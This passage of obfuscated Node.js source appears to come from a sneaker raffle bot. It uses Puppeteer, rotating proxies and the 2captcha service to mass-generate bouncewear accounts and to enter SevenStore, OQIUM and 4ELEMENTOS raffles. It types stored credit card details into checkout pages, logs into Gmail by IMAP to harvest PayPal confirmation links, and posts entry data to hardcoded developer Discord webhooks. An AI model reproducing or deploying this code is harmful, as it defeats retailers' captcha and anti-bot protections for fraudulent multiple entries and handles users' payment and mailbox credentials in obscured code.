        if (bouncewear[_0x32ce38]['Email'] == '' || bouncewear[_0x32ce38]['Password'] == '' || bouncewear[_0x32ce38]['FirstName'] == '' || bouncewear[_0x32ce38]['LastName'] == '') {
            console['log'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x196f8e['useRandomProxy'] = ![])
            var _0x22b616 = _0x3e1a77()[_0x32ce38]['split'](':');
        else
            var _0x1f1584 = Math['round'](Math['random']() * (_0x3e1a77()['length'] - 0x1)), _0x22b616 = _0x3e1a77()[_0x1f1584]['split'](':');
        const _0x404f46 = await _0x3dd4ff['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x22b616[0x0] + ':' + _0x22b616[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x383624 = await _0x404f46['newPage']();
            await _0x383624['authenticate']({
                'username': '' + _0x22b616[0x2],
                'password': '' + _0x22b616[0x3]
            }), console['log'](_0x508dba() + '\x20[' + _0x20c0ea['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x383624['setRequestInterception'](!![]), _0x383624['on']('request', _0x1f7453 => {
                _0x1f7453['resourceType']() === 'image' || _0x1f7453['resourceType']() === 'font' || _0x1f7453['resourceType']() === 'media' ? _0x1f7453['abort']() : _0x1f7453['continue']();
            }), await _0x383624['goto'](_0x18bc56), await _0x54262e(0xbb8), await _0x383624['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x508dba() + '\x20[' + _0x20c0ea['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20Filling\x20information'), await _0x383624['type']('#RegisterForm-FirstName', '' + bouncewear[_0x32ce38]['FirstName']), await _0x54262e(0x226), await _0x383624['type']('#RegisterForm-LastName', '' + bouncewear[_0x32ce38]['LastName']), await _0x54262e(0x226), await _0x383624['type']('#RegisterForm-email', '' + bouncewear[_0x32ce38]['Email']), await _0x54262e(0x226), await _0x383624['type']('#RegisterForm-password', '' + bouncewear[_0x32ce38]['Password']), await _0x54262e(0x226), await _0x383624['click']('#marketing'), console['log'](_0x508dba() + '\x20[' + _0x20c0ea['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20Submitting..'), await _0x383624['$eval']('#RegisterForm', _0x14c354 => _0x14c354['submit']()), await _0x54262e(0x1f40), console['log'](_0x508dba() + '\x20[' + _0x20c0ea['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x383624['solveRecaptchas'](), await _0x383624['click']('.shopify-challenge__button.btn');
            async function _0x546925() {
                for (var _0x429863 = 0x0; _0x429863 < 0x4; _0x429863++) {
                    try {
                        console['log']('try'), await _0x383624['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x508dba() + '\x20[' + _0x20c0ea['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20' + _0x351e10['red']('Catpcha\x20failed,\x20retrying..')), await _0x383624['solveRecaptchas'](), await _0x383624['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x546925(), console['log'](_0x508dba() + '\x20[' + _0x20c0ea['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x54262e(0x1f4);
            try {
                await _0x383624['waitForSelector']('.featured-title'), await _0x54262e(0x1f4), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x20c0ea['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x32ce38]['Email'] + '\x20Generated!')), _0x3a2baa['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x32ce38]['Email'] + ',' + bouncewear[_0x32ce38]['Password']), console['log'](_0x351e10['yellow'](_0x508dba() + '\x20[' + _0x20c0ea['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x32ce38]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x282da9) {
                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x282da9));
            }
        } catch (_0x4f2c32) {
            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x32ce38 + 0x1) + '\x20:\x20' + _0x4f2c32));
        } finally {
            _0x404f46 && _0x404f46['close'](), console['log']('Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
        }
    }
}
async function _0x3b3dda(_0x8fe867, _0x3f1227, _0x24ef7f) {
    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x196f8e['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x49ad7f = 0x0; _0x49ad7f < _0x3f1227['length']; _0x49ad7f++) {
        _0x3feae7(_0x8fe867['name'] + '\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20/\x20' + _0x3f1227['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24);
        var _0x39cd18 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x2ccb52
                },
                {
                    'name': 'Product',
                    'value': '' + _0x3f1227[_0x49ad7f]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3f1227[_0x49ad7f]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x196f8e['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x196f8e['version']
                }
            ]
        }];
        const _0x21aa6b = { 'embeds': _0x39cd18 };
        await _0x2e3034(_0x3f1227, _0x49ad7f);
        if (_0x3f1227[_0x49ad7f]['Email'] == '' || _0x3f1227[_0x49ad7f]['Password'] == '' || _0x3f1227[_0x49ad7f]['FirstName'] == '' || _0x3f1227[_0x49ad7f]['LastName'] == '') {
            console['log'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x3f1227[_0x49ad7f]['Password'] == '' || _0x3f1227[_0x49ad7f]['Password'] == undefined) && (_0x3f1227[_0x49ad7f]['Password'] = 'ErehsaWonRaj1!');
        if (_0x196f8e['useRandomProxy'] = ![])
            var _0x1e1cc4 = _0x24ef7f[_0x49ad7f]['split'](':');
        else
            var _0x508d2f = Math['round'](Math['random']() * (_0x24ef7f['length'] - 0x1)), _0x1e1cc4 = _0x24ef7f[_0x508d2f]['split'](':');
        const _0x4472a6 = await _0x3dd4ff['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1e1cc4[0x0] + ':' + _0x1e1cc4[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5f4c58 = await _0x4472a6['newPage']();
            await _0x5f4c58['authenticate']({
                'username': '' + _0x1e1cc4[0x2],
                'password': '' + _0x1e1cc4[0x3]
            }), console['log'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5f4c58['setRequestInterception'](!![]), _0x5f4c58['on']('request', _0x27ee03 => {
                _0x27ee03['resourceType']() === 'image' || _0x27ee03['resourceType']() === 'font' || _0x27ee03['resourceType']() === 'media' ? _0x27ee03['abort']() : _0x27ee03['continue']();
            }), await _0x5f4c58['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x5f4c58['goto']('' + _0x3f1227[_0x49ad7f]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x5f4c58['waitForSelector']('#btnPdpAtb'), console['log'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3f1227[_0x49ad7f]['Size']);
            const _0x46350d = await _0x5f4c58['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x25634e => {
                return _0x25634e['map'](_0x1ca52e => _0x1ca52e['innerText']);
            }), _0x32de5f = await _0x5f4c58['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x54270a = ![];
            if (_0x3f1227[_0x49ad7f]['Size'] == 'RANDOM') {
                var _0x38dd11 = Math['round'](Math['random']() * (_0x32de5f['length'] - 0x1));
                await _0x32de5f[_0x38dd11]['click']();
            } else
                for (var _0x1d7b9e = 0x0; _0x1d7b9e < _0x46350d['length']; _0x1d7b9e++) {
                    if (_0x46350d[_0x1d7b9e] != _0x3f1227[_0x49ad7f]['Size'])
                        continue;
                    try {
                        await _0x32de5f[_0x1d7b9e]['click']();
                    } catch {
                        console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x54270a = !![];
                    }
                }
            if (_0x54270a)
                continue;
            await _0x54262e(0x578), await _0x5f4c58['click']('#btnPdpAtb'), await _0x5f4c58['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x54262e(0x3e8), console['log'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x5f4c58['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x5f4c58['waitForSelector']('#email'), await _0x5f4c58['type']('#email', _0x3f1227[_0x49ad7f]['Email']), await _0x54262e(0x226), await _0x5f4c58['click']('#guest-submit'), await _0x54262e(0x1b58), console['log'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5f4c58['waitForSelector']('#firstname'), await _0x5f4c58['type']('#firstname', _0x3f1227[_0x49ad7f]['FirstName'], 0x1f4), await _0x54262e(0x190), await _0x5f4c58['waitForSelector']('#surname'), await _0x5f4c58['type']('#surname', _0x3f1227[_0x49ad7f]['LastName'], 0x1f4), await _0x54262e(0x190), await _0x5f4c58['waitForSelector']('#mobile'), await _0x5f4c58['type']('#mobile', _0x3f1227[_0x49ad7f]['Phone'], 0x1f4), await _0x54262e(0x190), await _0x5f4c58['click']('#enterManualDiv'), await _0x54262e(0x5dc), await _0x5f4c58['waitForSelector']('#address1'), await _0x5f4c58['type']('#address1', _0x3f1227[_0x49ad7f]['Address1'] + '\x20' + _0x3f1227[_0x49ad7f]['HouseNumber'], 0x226), await _0x54262e(0x384), await _0x5f4c58['waitForSelector']('#address2'), await _0x5f4c58['type']('#address2', '' + _0x3f1227[_0x49ad7f]['Address2'], 0x226), await _0x54262e(0x320);
            const _0x4c3392 = await _0x5f4c58['$$eval']('#countryselect_view3\x20>\x20option', _0x1a9b4e => {
                return _0x1a9b4e['map'](_0x11e7a3 => _0x11e7a3['value']);
            });
            var _0xaa559c;
            for (var _0x3d8ba0 = 0x0; _0x3d8ba0 < _0x4c3392['length']; _0x3d8ba0++) {
                if (_0x4c3392[_0x3d8ba0]['startsWith']('' + _0x3f1227[_0x49ad7f]['Country'])) {
                    _0xaa559c = _0x4c3392[_0x3d8ba0];
                    break;
                }
                continue;
            }
            await _0x5f4c58['select']('#countryselect_view3', '' + _0xaa559c), await _0x5f4c58['waitForSelector']('#address4'), await _0x5f4c58['type']('#address4', '' + _0x3f1227[_0x49ad7f]['City'], 0x1f4), await _0x54262e(0x384), await _0x5f4c58['waitForSelector']('#postcode'), await _0x5f4c58['type']('#postcode', '' + _0x3f1227[_0x49ad7f]['Zip'], 0x1f4), await _0x54262e(0x4b0);
            const _0x307610 = await _0x5f4c58['url']();
            console['log'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x820bca = _0x307610['split']('?')[0x1], _0x365fe3 = await _0x5f4c58['$']('#co_address_submit');
            await _0x365fe3['evaluate'](_0x1d85d5 => _0x1d85d5['click']()), await _0x54262e(0x1388), await _0x5f4c58['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x820bca), console['log'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x5f4c58['waitForSelector']('#paymentbuttons'), await _0x54262e(0x1388), await _0x5f4c58['click']('#paymentbuttons\x20>\x20div'), await _0x54262e(0x1c2), await _0x5f4c58['waitForSelector']('#card-number'), await _0x5f4c58['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x2540de = await _0x5f4c58['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0xe101c4 = await _0x2540de['contentFrame']();
            await _0xe101c4['waitForSelector']('.InputContainer'), await _0xe101c4['click']('.InputContainer\x20>\x20input'), await _0x54262e(0x578), await _0x5f4c58['type']('#card-number', '' + _0x3f1227[_0x49ad7f]['CreditNumber']), await _0x54262e(0xfa), await _0x5f4c58['type']('#card-expiry', '' + _0x3f1227[_0x49ad7f]['ExpiryDate']), await _0x54262e(0xfa), await _0x5f4c58['type']('#card-cvc', '' + _0x3f1227[_0x49ad7f]['CVV']), await _0x54262e(0x7d0), await _0x5f4c58['click']('#card-button'), console['log'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x5f4c58['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x459a7f(_0x26f37d, _0x21aa6b);
            } catch {
                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x203DS\x20Failed')), _0x39cd18[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x39cd18[0x0]['description'] = '3DS\x20Failed', await _0x459a7f(_0x491127, _0x21aa6b);
            }
        } catch (_0x4908fb) {
            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x8fe867['name'] + ']\x20Task\x20' + (_0x49ad7f + 0x1) + '\x20:\x20' + _0x4908fb)), _0x39cd18[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x39cd18[0x0]['description'] = '' + _0x4908fb, await _0x459a7f(_0x491127, _0x21aa6b);
        } finally {
            _0x4472a6 && _0x4472a6['close']();
            if (_0x49ad7f + 0x1 == _0x3f1227['length']) {
                console['log'](_0x351e10['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x54262e(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x196f8e['AfewDelay'] + '\x20ms'), await _0x54262e(_0x196f8e['AfewDelay']);
        }
    }
}
async function _0x4147e9(_0x3f46bd, _0x2f2f0e, _0x4a0ef6, _0x156fea, _0x322d31) {
    var _0x49b749, _0x6afa2f = {}, _0x462b4c = [], _0x12b0cf = {}, _0x6bf9ab = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x156fea && (_0x156fea = {});
    if (_0x2f2f0e != 'ver') {
        _0x3feae7(_0x4a0ef6['name'] + '\x20Task\x20' + (_0x3f46bd + 0x1) + '\x20/\x20' + _0x156fea['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x156fea, _0x3f46bd), _0x462b4c = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x2ccb52
                },
                {
                    'name': 'Size',
                    'value': '' + _0x156fea[_0x3f46bd]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x196f8e['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x5c71b0
                }
            ]
        }], _0x12b0cf = { 'embeds': _0x462b4c }, _0x6afa2f = _0x4a0ef6['data'];
        _0x2f2f0e == 'exp' ? _0x6afa2f['data']['attributes']['email'] = '' + _0x156fea[_0x3f46bd]['FirstName'] + _0x156fea[_0x3f46bd]['LastName'] + _0x196f8e['catchall'] : _0x6afa2f['data']['attributes']['email'] = '' + _0x156fea[_0x3f46bd]['Email'];
        if (_0x156fea[_0x3f46bd]['Size'] == 'RANDOM') {
        }
        _0x6afa2f['data']['attributes']['properties']['$first_name'] = '' + _0x156fea[_0x3f46bd]['FirstName'], _0x6afa2f['data']['attributes']['properties']['$last_name'] = '' + _0x156fea[_0x3f46bd]['LastName'], _0x6afa2f['data']['attributes']['properties']['$address1'] = _0x156fea[_0x3f46bd]['Address1'] + '\x20' + _0x156fea[_0x3f46bd]['Address2'] + '\x20' + _0x156fea[_0x3f46bd]['HouseNumber'], _0x6afa2f['data']['attributes']['properties']['$zip'] = '' + _0x156fea[_0x3f46bd]['Zip'], _0x6afa2f['data']['attributes']['properties']['$city'] = '' + _0x156fea[_0x3f46bd]['City'], _0x6afa2f['data']['attributes']['properties']['$country'] = '' + _0x156fea[_0x3f46bd]['Country'], _0x6afa2f['data']['attributes']['properties']['Size'] = '' + _0x156fea[_0x3f46bd]['Size'], _0x6afa2f['data']['attributes']['properties']['$phone_number'] = '' + _0x156fea[_0x3f46bd]['Phone'], _0x6afa2f['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x156fea[_0x3f46bd]['Follower'];
    }
    if (_0x196f8e['useRandomProxy'] = ![])
        var _0x5717b5 = _0x322d31[_0x3f46bd]['split'](':');
    else
        var _0x32cd94 = Math['round'](Math['random']() * (_0x322d31['length'] - 0x1)), _0x5717b5 = _0x322d31[_0x32cd94]['split'](':');
    var _0x45199a = {
        'jar': _0x3b7fa9,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x4a0ef6['url'],
        'headers': _0x4a0ef6['headers'],
        'body': JSON['stringify'](_0x6afa2f),
        'proxy': 'http://' + _0x5717b5[0x2] + ':' + _0x5717b5[0x3] + '@' + _0x5717b5[0x0] + ':' + _0x5717b5[0x1]
    };
    return _0x2f2f0e != 'ver' && (_0x45199a['url'] = _0x4a0ef6['url'], _0x45199a['headers'] = _0x4a0ef6['headers']), _0x2f2f0e == 'ver' && (_0x45199a['method'] = 'GET'), new Promise(function (_0x34ae26, _0x355f85) {
        callback = async (_0x31f963, _0xdff2e, _0x4bb594) => {
            if (!_0x31f963 && _0xdff2e['statusCode'] == 0xca || !_0x31f963 && _0xdff2e['statusCode'] == 0xc8) {
                if (_0x2f2f0e != 'ver') {
                    var _0x5b52ec = await _0x107feb(_0x156fea[_0x3f46bd], _0x4a0ef6, 'dev', ![]), _0x23b897 = await _0x107feb(_0x156fea[_0x3f46bd], _0x4a0ef6, 'pub', ![]);
                    const _0x196b75 = {
                        'succesDEVMSG': { 'embeds': [_0x5b52ec] },
                        'succesPUBMSG': { 'embeds': [_0x23b897] }
                    };
                    if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                        try {
                            await _0x459a7f(_0x196f8e['webhook'], _0x196b75['succesDEVMSG']);
                        } catch {
                        }
                    await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x196b75['succesDEVMSG']), await _0x54262e(0xc8);
                    try {
                        await _0x459a7f(_0xf106b7, _0x196b75['succesPUBMSG']);
                    } catch {
                    }
                    _0x3444cf(_0x156fea[_0x3f46bd], _0x4a0ef6);
                }
                _0x34ae26(console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x4a0ef6['name'] + ']\x20Task\x20' + (_0x3f46bd + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x2f2f0e != 'ver') {
                    var _0x5a7264 = '' + _0x31f963, _0x3cc639 = await _0x107feb(_0x156fea[_0x3f46bd], _0x4a0ef6, 'dev', !![], _0x5a7264), _0x45a183 = {};
                    _0x45a183['errorDEV'] = { 'embeds': [_0x3cc639] }, _0x29ff38(_0x156fea[_0x3f46bd], _0x4a0ef6), _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x45a183['errorDEV']), await _0x459a7f(_0x491127, _0x45a183['errorDEV']);
                }
                _0x355f85(console['log'](_0x508dba() + '\x20[' + _0x4a0ef6['name'] + ']\x20Task\x20' + (_0x3f46bd + 0x1) + ':\x20' + _0x31f963));
            }
        };
        try {
            _0x2f2f0e != 'ver' && console['log'](_0x508dba() + '\x20[' + _0x4a0ef6['name'] + ']\x20Task\x20' + (_0x3f46bd + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x6afa2f['data']['attributes']['email']), _0x2ed36a(_0x45199a, callback);
        } catch (_0x3faec9) {
            console['log'](_0x508dba() + '\x20Task\x20' + (_0x3f46bd + 0x1) + ':\x20' + _0x3faec9);
        }
    });
}
;
async function _0x226ea2(_0x5ce422, _0x28cff2) {
    if (_0x4e4499 != 'yes')
        var _0x4e4499 = '', _0x282953 = 0x0;
    var _0x178def = [];
    async function _0x3cbd29() {
        console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify?');
        var _0x112c73 = await _0x525726['get']('Quantity')['Quantity'], _0x29cd43 = new _0x5deaaa({
            'user': _0x196f8e['masterMail'],
            'password': _0x196f8e['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x213782(_0x3d8595) {
            _0x29cd43['openBox']('INBOX', ![], _0x3d8595);
        }
        _0x29cd43['once']('ready', function () {
            _0x213782(function (_0x515669, _0x3c22c1) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x515669)
                    throw _0x515669;
                _0x29cd43['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x1cfb1e, _0xdf6e42) {
                    if (!_0xdf6e42 || !_0xdf6e42['length'])
                        console['log'](_0x508dba() + '\x20[' + _0x5ce422['name'] + ']\x20No\x20mails\x20found'), _0x29cd43['end']();
                    else {
                        var _0x59df4f = _0x29cd43['seq']['fetch'](_0xdf6e42, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x59df4f['on']('message', function (_0x105071, _0xca5f36) {
                            var _0x258951 = '(#' + _0xca5f36 + ')\x20';
                            _0x105071['on']('body', function (_0x266226, _0x51b31a) {
                                _0x45f099(_0x266226, (_0x5b4bad, _0x3866c5) => {
                                    if (_0x3866c5['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x3866c5['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x3866c5['text']['split']('[')[0x2];
                                        var _0x9a1877 = mes['split'](']')[0x0];
                                        _0x178def['push'](_0x9a1877);
                                    }
                                });
                            }), _0x105071['once']('end', function () {
                            });
                        }), _0x59df4f['once']('error', function (_0x306343) {
                            console['log']('Fetch\x20error:\x20' + _0x306343);
                        }), _0x59df4f['once']('end', function () {
                            _0x29cd43['end']();
                        });
                    }
                });
            });
        }), _0x29cd43['once']('error', function (_0x172a7f) {
            console['log'](_0x351e10['red'](_0x172a7f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x29cd43['once']('end', async function () {
        }), _0x29cd43['connect']();
    }
    try {
        _0x3cbd29(), await _0x54262e(0xfa0), console['log']('Found\x20' + _0x178def['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x54262e(0xfa0);
    }
    var _0x1d9272;
    _0x3feae7('' + _0x5ce422);
    var _0x2dcd94 = _0x28cff2[0x0]['split'](':'), _0x1b6fc5;
    try {
        _0x1b6fc5 = await _0x3dd4ff['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2dcd94[0x0] + ':' + _0x2dcd94[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x1b6fc5 = await _0x3dd4ff['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2dcd94[0x0] + ':' + _0x2dcd94[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x508dba() + '\x20[' + _0x5ce422 + ']\x20Getting\x20Session');
        const _0x725b16 = await _0x1b6fc5['newPage']();
        await _0x725b16['authenticate']({
            'username': '' + _0x2dcd94[0x2],
            'password': '' + _0x2dcd94[0x3]
        }), await _0x725b16['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x725b16, await _0x725b16['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x508dba() + '\x20[' + _0x5ce422 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x725b16['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x508dba() + '\x20[' + _0x5ce422 + ']\x20Successfully\x20logged\x20in'), await _0x54262e(0x2710);
        } catch (_0x391e52) {
            throw new Error('Login\x20session\x20expired\x20' + _0x391e52);
        }
        for (var _0x3553f8 = 0x0; _0x3553f8 < _0x178def['length']; _0x3553f8++) {
            console['log'](_0x508dba() + '\x20[' + _0x5ce422 + ']\x20Task\x20' + (_0x3553f8 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x3feae7(_0x5ce422 + '\x20Task\x20' + (_0x3553f8 + 0x1) + '\x20/\x20' + _0x178def['length']);
            const _0x202e06 = await _0x1b6fc5['newPage']();
            await _0x202e06['goto']('' + _0x178def[_0x3553f8], { 'waitUntil': 'networkidle2' }), await _0x54262e(0xbb8);
            try {
                const _0x3add15 = await _0x202e06['$']('#challenge-heading');
                _0x3add15 && (console['log'](_0x508dba() + '\x20[' + _0x5ce422 + ']\x20Task\x20' + (_0x3553f8 + 0x1) + '\x20:\x20' + _0x351e10['yellow']('2FA\x20Required')), await _0x202e06['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x54262e(0x9c40), await _0x202e06['waitForSelector']('#payment-submit-btn'), await _0x202e06['$eval']('#payment-submit-btn', _0x47e520 => _0x47e520['click']()), await _0x202e06['click']('#payment-submit-btn');
                try {
                    await _0x202e06['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x54262e(0x5dc), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x5ce422 + ']\x20Task\x20' + (_0x3553f8 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x5878f0) {
                    _0x4e4499 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x5878f0['message']);
                } finally {
                    if (_0x4e4499 == 'yes' && _0x282953 != 0x2) {
                        console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5ce422['name'] + ']\x20Task\x20' + (_0x3553f8 + 0x1) + '\x20:\x20Retrying')), _0x3553f8 = _0x3553f8 - 0x1, _0x282953 = _0x282953 + 0x1;
                        continue;
                    }
                    _0x4e4499 == 'yes' && _0x282953 >= 0x2 && (_0x29ff38(csv[_0x3553f8], _0x5ce422), _0x4e4499 = 'no', _0x282953 = 0x0), await _0x202e06['close'](), await _0x54262e(0x4650);
                }
            } catch (_0x5b79b8) {
                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5ce422 + ']\x20Task\x20' + (_0x3553f8 + 0x1) + '\x20:\x20' + _0x5b79b8));
            }
        }
    } catch (_0x521364) {
        console['log'](_0x351e10['red']('' + _0x521364));
    } finally {
        await _0x1b6fc5['close']();
    }
}
const _0x34a60a = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x24f965, _0x376c2f, _0x1edcb3) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x39deda = 0x0; _0x39deda < _0x376c2f['length']; _0x39deda++) {
                        if (_0x121746 != 'yes')
                            var _0x121746 = '', _0x2199d2 = 0x0;
                        var _0x38e762;
                        await _0x2e3034(_0x376c2f, _0x39deda), _0x3feae7(_0x24f965['name'] + '\x20Task\x20' + (_0x39deda + 0x1) + '\x20/\x20' + _0x376c2f['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24);
                        var _0xbc7a8f = [
                            '40',
